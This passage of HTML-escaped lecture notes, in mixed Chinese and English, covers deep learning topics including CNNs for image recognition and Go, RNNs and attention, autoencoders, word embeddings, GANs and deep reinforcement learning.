&lt;/ul&gt;
&lt;h3&gt;Why CNN for Image?&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Some patterns are much smaller than the whole image.  &lt;ul&gt;
&lt;li&gt;A neuron does not have to see the whole image to discover pattern.  &lt;/li&gt;
&lt;li&gt;Connecting to small region with less parameters.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;The same patterns appear in different regions.  &lt;/li&gt;
&lt;li&gt;Subsampling the pixels will not change the object.  &lt;ul&gt;
&lt;li&gt;算是處理 image 上獨有的特性  &lt;/li&gt;
&lt;li&gt;We can subsmaple the pixel to make image smaller  &lt;ul&gt;
&lt;li&gt;Less parameters for the network to process the image  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;The Whole CNN&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Image =&amp;gt; &lt;code&gt;{Convolution =&amp;gt; Max Pooling}*N&lt;/code&gt; =&amp;gt; Flatten =&amp;gt; Fully Connected Feedforward Network  &lt;/li&gt;
&lt;li&gt;特性  &lt;ul&gt;
&lt;li&gt;和 Convolution 有關  &lt;ul&gt;
&lt;li&gt;Some patterns are much smaller than the whole image.  &lt;/li&gt;
&lt;li&gt;The same patterns appear in different regions.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;和 Max Pooling 有關  &lt;ul&gt;
&lt;li&gt;Subsampling the pixels will not change the object  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Image Recognition&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Local Connectivity  &lt;ul&gt;
&lt;li&gt;Neurons connected to a small region  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Parameter Sharing  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;The same feature in different positions  &lt;ul&gt;
&lt;li&gt;Neurons share the same weights  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Different features in the same position  &lt;ul&gt;
&lt;li&gt;Neurons have different weights  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Convolutional Layers  &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;Hyper-parameters of CNN  &lt;ul&gt;
&lt;li&gt;Stride  &lt;ul&gt;
&lt;li&gt;要隔多少去算下一個 information  &lt;/li&gt;
&lt;li&gt;如果覺得這張圖上的 information 是非常鬆散的，那 stride 就可以設高一點，讓他多隔幾層再去找 pattern  &lt;/li&gt;
&lt;li&gt;如果覺得這張圖上的 information 是非常緊密的，那 stride 就只能設低一點。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Padding  &lt;ul&gt;
&lt;li&gt;讓每一層的數值不要減少的太快  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Pooling Layer  &lt;ul&gt;
&lt;li&gt;Max Pooling  &lt;ul&gt;
&lt;li&gt;把最大的值保存下來  &lt;/li&gt;
&lt;li&gt;Image processing 比較常使用 Max Pooling  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Average Pooling  &lt;ul&gt;
&lt;li&gt;把平均的數值保存下來  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;壓縮資訊，減少下一層需要參數的量，使其更有效率。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Why Deep Learing works for image recogniton?  &lt;ul&gt;
&lt;li&gt;每個 node 會學習一些簡單的筆劃，組合起來後才會變成一個字。  &lt;/li&gt;
&lt;li&gt;愈前面的結果會愈簡單和基本，可能只是些筆劃，經過 Convolution 和 Max Pooling 後，可以用被壓縮後的較少資訊學習比較抽象的組合。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Fully-Connected Layer  &lt;ul&gt;
&lt;li&gt;Global feature extraction  &lt;/li&gt;
&lt;li&gt;Softmax Layer: Classifier  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;What CNN Learned  &lt;ul&gt;
&lt;li&gt;[AlexNet]  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;DNN are easily fooled  &lt;ul&gt;
&lt;li&gt;可以捏造一些奇怪的 input，看起來只是一些 noise，因為 DNN 會特別著重某些 pattern，所以會將這些圖誤判為目標物。  &lt;/li&gt;
&lt;li&gt;滿多資安的論文現在在探討攻擊 DNN 的手法。  &lt;/li&gt;
&lt;li&gt;Visualizing CNN  &lt;ul&gt;
&lt;li&gt;調整 noise 的 input，使其 filter response 更接近目標物的 filter response，有點像是反過來的 training  &lt;/li&gt;
&lt;li&gt;透過 Gradient Ascent 去微調  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://deepdreamgenerator.com/"&gt;https://deepdreamgenerator.com/&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;Deep Style  &lt;ul&gt;
&lt;li&gt;一張圖保留 Content  &lt;/li&gt;
&lt;li&gt;另一張圖保留 Style  &lt;/li&gt;
&lt;li&gt;然後去調整保留 Content 的那張圖，並使用另一張圖的 Style  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Go Playing （下圍棋）  &lt;ul&gt;
&lt;li&gt;Conditions  &lt;ul&gt;
&lt;li&gt;Input: 目前棋盤的狀況  &lt;/li&gt;
&lt;li&gt;Output: 下一步應該下哪裡？  &lt;/li&gt;
&lt;li&gt;19x19 vector  &lt;/li&gt;
&lt;li&gt;black = 1, white = -1, none = 0  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Fully-Connected Feedforward Network could be used, but why CNN?  &lt;ul&gt;
&lt;li&gt;Some patterns are much smaller than the whole image  &lt;ul&gt;
&lt;li&gt;棋譜會有一些固定的 pattern  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;The same patterns appear in different regions  &lt;ul&gt;
&lt;li&gt;同樣的 pattern 有可能出現在棋盤上不同的地方  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Subsampling the pixels will not change the object  &lt;ul&gt;
&lt;li&gt;把棋譜作 subsampling 會讓整個棋譜的結果失真  &lt;/li&gt;
&lt;li&gt;因為 Subsampling 只和 Max Pooling Layer 有關，所以在 AlphaGo 的論文中有提到只有使用 Convolutional Layer，把 Max Pooling Layer 拿掉了。  &lt;/li&gt;
&lt;li&gt;如果不是很熟悉下圍棋以及 DNN 的 domain knowledge 的話，直接拿 CNN 去做是訓練不出什麼結果的，這也是為什麼 Alpha Go 會需要像黃士傑博士這樣會下圍棋又懂 Machine Learning 的人。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Recurrent Neural Network (RNN)&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Example Application  &lt;ul&gt;
&lt;li&gt;Slot Filling  &lt;ul&gt;
&lt;li&gt;Solved by Feedforward Network?  &lt;ul&gt;
&lt;li&gt;Input: a word  &lt;/li&gt;
&lt;li&gt;Output: probability distribution that the input word belonging to the slots  &lt;/li&gt;
&lt;li&gt;Problem  &lt;ul&gt;
&lt;li&gt;Arrive Taipei on November 2nd  &lt;ul&gt;
&lt;li&gt;Taipei 是目的地  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Leave Taipei on November 2nd  &lt;ul&gt;
&lt;li&gt;Taipei 是出發地  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;用 RNN 來解決  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;One-Hot Vector  &lt;ul&gt;
&lt;li&gt;1-of-N Encoding  &lt;/li&gt;
&lt;li&gt;有 N 個詞就用 N 維的矩陣來表示，如果該字有出現的話值就是 1，其他值就會是 0。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;RNN  &lt;ul&gt;
&lt;li&gt;The output of hidden layer are stored in the memory  &lt;/li&gt;
&lt;li&gt;Memory can be considered as another input  &lt;/li&gt;
&lt;li&gt;每一層都是拿現在看到的資訊和上一層的 memory 當成 input  &lt;/li&gt;
&lt;li&gt;不會因為層數比較多（語句比較長）就導致參數變多，參數的數量都是一樣的。  &lt;/li&gt;
&lt;li&gt;存在 memory 的 value 會影響最終的 prediction  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Deep RNN: 多層  &lt;/li&gt;
&lt;li&gt;Why use RNN in language processing?  &lt;ul&gt;
&lt;li&gt;因為語言是有時間順序的  &lt;/li&gt;
&lt;li&gt;如果 input 是時間順序非常重要的話，就可以考慮用 RNN 來做。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Bidirectional RNN  &lt;ul&gt;
&lt;li&gt;將 input 反向來作並加入 memory  &lt;/li&gt;
&lt;li&gt;缺點是會比較費時  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Learning Target  &lt;ul&gt;
&lt;li&gt;會比較複雜一些  &lt;/li&gt;
&lt;li&gt;一句話有五個詞，訓練一句話等於要拿到 5 個 targets  &lt;ul&gt;
&lt;li&gt;因為要判斷每個詞的 label  &lt;/li&gt;
&lt;li&gt;因為彼此是有順序相依性的，所以 loss 會是每層 layer 相加  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Training Difficulty - Rough Error Surface  &lt;ul&gt;
&lt;li&gt;The error surface is either very flat or very steep  &lt;ul&gt;
&lt;li&gt;非常難學習  &lt;/li&gt;
&lt;li&gt;所以會有一些各式各樣的小技巧出現在 RNN 裏面  &lt;ul&gt;
&lt;li&gt;Clipping  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Large &lt;code&gt;δL/δw&lt;/code&gt; =&amp;gt; Large Learning rate  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Many-to-One  &lt;ul&gt;
&lt;li&gt;Input is a vector sequence, but output is only one vector  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Many-to-Many (Output is shorter)  &lt;ul&gt;
&lt;li&gt;Both input and output are sequences, but the output is shorter  &lt;/li&gt;
&lt;li&gt;E.g. Speech Recognition  &lt;ul&gt;
&lt;li&gt;Input: vector sequence  &lt;/li&gt;
&lt;li&gt;Output: character sequence  &lt;/li&gt;
&lt;li&gt;Connectionist Temporal Classification (CTC)  &lt;ul&gt;
&lt;li&gt;加了一個額外的 symble &lt;code&gt;ϕ&lt;/code&gt; 來代表 Null  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;好好好棒棒棒棒&lt;/code&gt; vs &lt;code&gt;好ϕϕ棒ϕϕ棒&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;這樣就可以知道到底是一個棒還是兩個棒  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Many-to-Many (Output is no limitation)  &lt;ul&gt;
&lt;li&gt;Both input and output are sequences with different lengths  &lt;ul&gt;
&lt;li&gt;Sequence to sequence learning  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;E.g. Machine Translation  &lt;ul&gt;
&lt;li&gt;"Machine Learning" =&amp;gt; "機器學習"  &lt;/li&gt;
&lt;li&gt;Problem: Don't know when to stop  &lt;ul&gt;
&lt;li&gt;加上一個代表斷句或結尾的符號  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Image Caption Generation  &lt;ul&gt;
&lt;li&gt;給一張圖，描述出圖裏面有什麼  &lt;/li&gt;
&lt;li&gt;將圖餵給 CNN 後，會產出一個代表整章圖的 vector  &lt;/li&gt;
&lt;li&gt;將 vector 餵給 RNN  &lt;/li&gt;
&lt;li&gt;Example  &lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.captionbot.ai/"&gt;http://www.captionbot.ai/&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Video Caption Generation  &lt;ul&gt;
&lt;li&gt;每一個 Video 用 CNN  &lt;/li&gt;
&lt;li&gt;Video 裡面的每一張 Image 用 RNN  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Chit-Chat Bot  &lt;ul&gt;
&lt;li&gt;拿對話中其中一方的話當 input，另一方的話當 output 去訓練。  &lt;/li&gt;
&lt;li&gt;比較常用到 &lt;a href="https://en.wikipedia.org/wiki/Long_short-term_memory"&gt;LSTM&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;&lt;a href="http://colah.github.io/posts/2015-08-Understanding-LSTMs/"&gt;http://colah.github.io/posts/2015-08-Understanding-LSTMs/&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Sci-Fi Short Film generated by AI - SUNSPRING  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=LY7x2lhqj"&gt;https://www.youtube.com/watch?v=LY7x2lhqj&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Attention and Memory  &lt;ul&gt;
&lt;li&gt;Question =&amp;gt; Organize =&amp;gt; Answer  &lt;ul&gt;
&lt;li&gt;被稱做 Attention  &lt;/li&gt;
&lt;li&gt;只會拿有用的資訊出來回答  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Attention on Sensory Info  &lt;ul&gt;
&lt;li&gt;Info from the sensors =&amp;gt; Sensory Memory == Attention ==&amp;gt; Working Memeory == Encode ==&amp;gt; Long-term Memory  &lt;/li&gt;
&lt;li&gt;Logn-term Memory == Retrieval ==&amp;gt; Working Memory  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Machine Translation with Attention  &lt;ul&gt;
&lt;li&gt;Keyword: "Attentional sequence to sequence model"  &lt;/li&gt;
&lt;li&gt;先用 match 判斷跟哪一塊的相似程度最高  &lt;/li&gt;
&lt;li&gt;目前 Google Translation 就是用這個 model 實現的  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Speech Recognition with Attention  &lt;ul&gt;
&lt;li&gt;比較深色的地方就是 Attention 比較高的部份  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Image Captioning with Attention  &lt;ul&gt;
&lt;li&gt;從錯誤的 prediction 中去瞭解判斷錯誤的可能原因  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Video Captioning with Attention  &lt;/li&gt;
&lt;li&gt;Reading Comprehension  &lt;ul&gt;
&lt;li&gt;Document =&amp;gt; 被切分成不同的詞被當作 feature  &lt;/li&gt;
&lt;li&gt;Question == RNN ==&amp;gt; q vector  &lt;/li&gt;
&lt;li&gt;根據 q vector 去決定哪一個句子最相關，再放入 DNN 裡頭去回答  &lt;/li&gt;
&lt;li&gt;Hopping  &lt;ul&gt;
&lt;li&gt;Memory Network  &lt;ul&gt;
&lt;li&gt;有可能第一次得到的結果不夠準確  &lt;/li&gt;
&lt;li&gt;用抽取出來資訊再做一次 Attention，再得到新的 information 並把它抽取出來。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;When the input is a very long sequence or an image  &lt;ul&gt;
&lt;li&gt;Pay attention on partial of the input object each time  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;In RNN/LSTM, larger memory implies more parameters  &lt;ul&gt;
&lt;li&gt;Increasing memory size will not increasing parameters  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Neural Turing Machine  &lt;ul&gt;
&lt;li&gt;an advanced RNN/LSTM  &lt;/li&gt;
&lt;li&gt;把 Long-term Memory 裡頭的資訊 retrieve 出來  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h1&gt;Part III: Beyond Supervised Learning &amp;amp; Recent Trends (Unsupervised Learning)&lt;/h1&gt;
&lt;h2&gt;Introduction&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Big data != Big annotated data  &lt;ul&gt;
&lt;li&gt;What can we do if there is no sufficient labelled training data?  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Machine learning techniques include:  &lt;ul&gt;
&lt;li&gt;Supervised learning (if we have labelled data)  &lt;/li&gt;
&lt;li&gt;Reinforcement learning (if we have an environment for reward)  &lt;/li&gt;
&lt;li&gt;Unsupervised learning (if we do not have labelled data)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Semi-Supervised Learning&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;應用環境  &lt;ul&gt;
&lt;li&gt;沒有全部的 input data 都有 label 時  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;概念  &lt;ul&gt;
&lt;li&gt;The distribution of the unlabeled data provides some cues  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Transfer Learning&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;應用環境  &lt;ul&gt;
&lt;li&gt;Input data 中沒有 output 想要的 class label  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;概念  &lt;ul&gt;
&lt;li&gt;Using sufficient labeled data to learn a CNN  &lt;/li&gt;
&lt;li&gt;Using this CNN as feature extractor  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;舉例  &lt;ul&gt;
&lt;li&gt;研究生 vs 漫畫家  &lt;ul&gt;
&lt;li&gt;研究生 == 漫畫家  &lt;/li&gt;
&lt;li&gt;指導教授 == 責任編輯  &lt;/li&gt;
&lt;li&gt;跑實驗 == 畫分鏡  &lt;/li&gt;
&lt;li&gt;投稿期刊 == 投稿 Jump  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Unsupervised Learning&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;概念  &lt;ul&gt;
&lt;li&gt;Representation Learning: 化繁為簡  &lt;/li&gt;
&lt;li&gt;Generative Model: 無中生有  &lt;/li&gt;
&lt;li&gt;化繁為簡和無中生有的過程是相反的  &lt;ul&gt;
&lt;li&gt;化繁為簡：拿到很多跟樹有關的圖片，簡化得出一個代表樹的 output，學習到的是這些圖片共同的特徵  &lt;/li&gt;
&lt;li&gt;無中生有：code 經過 function 之後就生成很多跟樹很像的圖片  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Latent Factors  &lt;ul&gt;
&lt;li&gt;共同特徵  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;化繁為簡 Representation Learning  &lt;ul&gt;
&lt;li&gt;Autoencoder  &lt;ul&gt;
&lt;li&gt;希望能把比較重要的資訊壓縮到比較小的 pattern 裏面  &lt;/li&gt;
&lt;li&gt;represent the images of digits in a more compact way  &lt;/li&gt;
&lt;li&gt;Output of the hidden layer is the code  &lt;/li&gt;
&lt;li&gt;Deep autoencoder  &lt;/li&gt;
&lt;li&gt;Similar Image Retrieval  &lt;/li&gt;
&lt;li&gt;可以把 image 最重要的 feature 保留起來  &lt;/li&gt;
&lt;li&gt;For DNN Pre-Training  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Word Vector/Embedding  &lt;ul&gt;
&lt;li&gt;Machine learn the meaning of words from reading a lot of documents without supervision  &lt;/li&gt;
&lt;li&gt;A word can be understood by its context  &lt;/li&gt;
&lt;li&gt;類似的句型中，同樣位置的不相同詞可能有高度相關性  &lt;/li&gt;
&lt;li&gt;Prediction-Based  &lt;ul&gt;
&lt;li&gt;給前面的字 predict 下一個字 (Linear Model)  &lt;ul&gt;
&lt;li&gt;前面的字當 input，後面的字當 output，一直這樣接下去。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Various Architecture  &lt;ul&gt;
&lt;li&gt;Continuous bag of word (CBOW) model  &lt;ul&gt;
&lt;li&gt;給兩邊的字 predict 中間的字  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Skip-gram  &lt;ul&gt;
&lt;li&gt;給中間的字 predict 兩邊的字  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;完全不需要 label data，程式可以自己去學習這些詞之間的關係  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;無中生有 Generative model  &lt;ul&gt;
&lt;li&gt;概念  &lt;ul&gt;
&lt;li&gt;想讓程式自動幫我們生不同的 training data  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://blog.openai.com/generative-models/"&gt;https://blog.openai.com/generative-models/&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;PixelRNN  &lt;ul&gt;
&lt;li&gt;To create an image, generating a pixel each time  &lt;/li&gt;
&lt;li&gt;Can be trained just with a large collection of images without any annotation  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Generative Adversarial Network (GAN)  &lt;ul&gt;
&lt;li&gt;Discriminative vs Generative Models  &lt;ul&gt;
&lt;li&gt;Discriminative  &lt;ul&gt;
&lt;li&gt;learns a function that maps the input data (x) to some desired output class label (y)  &lt;ul&gt;
&lt;li&gt;directly learn the conditional distribution P(y|x)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Generative  &lt;ul&gt;
&lt;li&gt;tries to learn the joint probability of the input data and labels simultaneously, i.e. P(x,y)  &lt;ul&gt;
&lt;li&gt;can be converted to P(y|x) for classification via Bayes rule  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;generative models have the potential to understand and explain&lt;br /&gt;
the underlying structure of the input data even when there are no labels  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;跟演化的感覺有點類似  &lt;ul&gt;
&lt;li&gt;Generator  &lt;ul&gt;
&lt;li&gt;Hidden Layer (code) ===decode===&amp;gt; output layer =&amp;gt; output  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;概念  &lt;ul&gt;
&lt;li&gt;Two competing neural networks: generator &amp;amp; discriminator  &lt;/li&gt;
&lt;li&gt;noise ==generator==&amp;gt; generator sample =&amp;gt; discriminator ==yes/no==&amp;gt; data sample  &lt;/li&gt;
&lt;li&gt;generator 生出圖片，discriminator 判斷這張產生出來的圖片是不是真的  &lt;/li&gt;
&lt;li&gt;彼此之間會互相競爭學習  &lt;/li&gt;
&lt;li&gt;Training two networks jointly =&amp;gt; the generator knows how to adapt its parameters in order to produce output data that can fool the discriminator  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Examples  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://openai.com/blog/generative-models"&gt;Cifar-10&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;Generated Bedrooms  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/mattya/chainer-DCGAN"&gt;Comics Drawing&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;Pokémon Creation  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Reinforcement Learning&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;概念  &lt;ul&gt;
&lt;li&gt;Agent, Environment 之間彼此是可以互動的  &lt;/li&gt;
&lt;li&gt;Environment 會給 Agent 一個 Observation  &lt;/li&gt;
&lt;li&gt;Agent 會對這個 Observation 做出 Action  &lt;/li&gt;
&lt;li&gt;Environment 會根據 Action 的不同給予 Agent 不同的 Reward  &lt;/li&gt;
&lt;li&gt;根據 Reward 來學習要做或不做哪些行為  &lt;/li&gt;
&lt;li&gt;Agent learns to take actions to maximize expected reward.  &lt;/li&gt;
&lt;li&gt;困難點  &lt;ul&gt;
&lt;li&gt;可能的 sequence 是非常龐大的  &lt;/li&gt;
&lt;li&gt;很難調整，因為只拿得到一連串的 Actions 之後的 Reward，無法確定到底是錯在哪一個 Action  &lt;/li&gt;
&lt;li&gt;Reward may be delayed  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Supervised vs Reinforcement  &lt;ul&gt;
&lt;li&gt;Supervised  &lt;ul&gt;
&lt;li&gt;就像在學校裏面，每一步都有老師會帶領你，告訴你每一步是對是錯  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Reinforcement  &lt;ul&gt;
&lt;li&gt;做了一連串的動作以後，到一個正面或負面的回饋，不確定到底問題出錯在哪一個地方。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;範例  &lt;ul&gt;
&lt;li&gt;走迷宮  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Reinforcement Learning Approach  &lt;ul&gt;
&lt;li&gt;Policy-based RL  &lt;ul&gt;
&lt;li&gt;Search directly for optimal policy  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Value-based RL  &lt;ul&gt;
&lt;li&gt;Estimate the optimal value function  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Model-based RL  &lt;ul&gt;
&lt;li&gt;Build a model of the environment  &lt;/li&gt;
&lt;li&gt;Plan (e.g. by lookahead) using model  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Deep Reinforcement Learning  &lt;ul&gt;
&lt;li&gt;Idea: deep learning for reinforcement learning  &lt;ul&gt;
&lt;li&gt;Use deep neural networks to represent  &lt;/li&gt;
&lt;li&gt;Optimize loss function by SGD  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Value Function Approximation  &lt;/li&gt;
&lt;li&gt;Q-Networks  &lt;ul&gt;
&lt;li&gt;Q-networks represent value functions with weights  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Q-Learning  &lt;ul&gt;
&lt;li&gt;Goal: estimate optimal Q-values  &lt;ul&gt;
&lt;li&gt;Optimal Q-values obey a Bellman equation  &lt;/li&gt;
&lt;li&gt;Value iteration algorithms solve the Bellman equation  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Deep Q-Networks (DQN)  &lt;/li&gt;
&lt;li&gt;Stability Issues with Deep RL  &lt;ul&gt;
&lt;li&gt;Naive Q-learning oscillates or diverges with neural nets  &lt;ul&gt;
&lt;li&gt;Data is sequential  &lt;ul&gt;
&lt;li&gt;Successive samples are correlated, non-iid (independent and&lt;br /&gt;
identically distributed)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Policy changes rapidly with slight changes to Q-values  &lt;ul&gt;
&lt;li&gt;Policy may oscillate  &lt;/li&gt;
&lt;li&gt;Distribution of data can swing from one extreme to another  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Scale of rewards and Q-values is unknown  &lt;ul&gt;
&lt;li&gt;Naive Q-learning gradients can be unstable when backpropagated  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Stable Solutions for DQN  &lt;ul&gt;
&lt;li&gt;DQN provides a stable solutions to deep value-based RL  &lt;ul&gt;
